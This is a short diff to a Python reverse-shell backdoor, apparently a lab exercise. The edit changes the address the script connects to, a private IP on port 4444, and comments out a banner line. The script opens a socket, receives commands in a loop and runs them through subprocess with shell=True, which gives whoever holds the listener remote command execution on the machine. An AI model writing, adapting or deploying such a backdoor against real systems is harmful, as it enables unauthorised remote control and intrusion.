@@ -7,8 +7,8 @@ def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.0.0", 4444))
-connection.send("\n[+] Connection Established\n")
+connection.connect(("192.168.182.141", 4444))
+#connection.send("\n[+] Connection Established\n")
 
 while True:
     command = connection.recv(1024)
